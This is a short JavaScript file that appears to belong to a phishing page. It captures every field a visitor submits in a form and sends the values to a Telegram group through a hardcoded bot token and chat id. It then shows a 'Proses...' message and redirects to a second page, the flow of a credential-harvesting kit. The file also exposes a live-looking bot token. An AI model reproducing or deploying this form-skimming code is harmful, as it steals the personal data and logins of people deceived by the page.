

const token = '8165500454:AAE-YBfjyTfntR2QEVkw7qCe2crgfkQlLzw'
const group_id = '-4694771351'

const formtelegram = document.getElementById('formTele')

const sendMessage = (text) => {
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "chat_id": group_id,
            "text": text,
        })
    }).then(res => {
        if (!res.ok) {
            throw new Error(res.statusText, res.status, res.url);
        }
        document.getElementById('kirim').innerHTML = 'Proses...';
        setTimeout(function () {
            window.location.href = "1/index2.html";
        }, 5000);
        return res.json();
    }).then(res => {
        console.log(res);
    }).catch(err => {
        console.log(err);
        alert('gagal')
    })
};

formtelegram.onsubmit = (e) => {
    e.preventDefault();

    const formData = new FormData(formtelegram)

    let text = '';

    for (const [key, val] of formData) {
        console.log(`${key}:`, val);

        text += `\n\n${key}:\n${val}`;

    }

    text = text.replace('\n\n', '');

    sendMessage(text)
}
$(window).load(function () {
    // Preloader
    $('.loader').fadeOut();
    $('.loader-mask').delay(3000).fadeOut('slow');
});